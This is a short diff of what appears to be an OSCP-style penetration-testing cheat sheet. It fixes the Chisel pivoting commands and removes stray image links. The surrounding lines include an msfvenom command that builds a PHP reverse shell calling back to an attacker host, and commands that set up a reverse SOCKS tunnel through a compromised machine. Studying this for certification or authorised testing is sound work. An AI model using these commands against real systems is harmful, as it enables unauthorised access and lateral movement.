@@ -400,7 +400,7 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 #On your attacking machine (192.168.60.200) setup a Chisel server with:
 #PORT = port for the Chisel traffic
 #socks5 = to setup a SOCKS5 proxy
-#reverse = to tell Chisel to wait for a connection from a client![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/a7790501-9a7e-42d5-a7ee-a53a3760d695)
+#reverse = to tell Chisel to wait for a connection from a client
 chisel server --port 1080 --sock5 --reverse
 
 #On your attacking machine edit the file /etc/proxychains4.conf #1080 is the sock5 port
@@ -413,7 +413,7 @@ socks5 127.0.0.1 1080
 #PORT = The port you set on your Chisel sever
 #R:socks = enables the reverse SOCKS proxy
 #max-retry-count 1 = to exit Chisel when you kill your server
-.\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 --sock5 --reverse![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/835958fd-df20-4b71-9cb9-f605e2a35f8f)
+.\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 R:socks
 
 #You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
 #The traffic flows into port 1080 on your machine and out on your jump host, which has established a connection back to your listener on the port you specified when executing chisel server
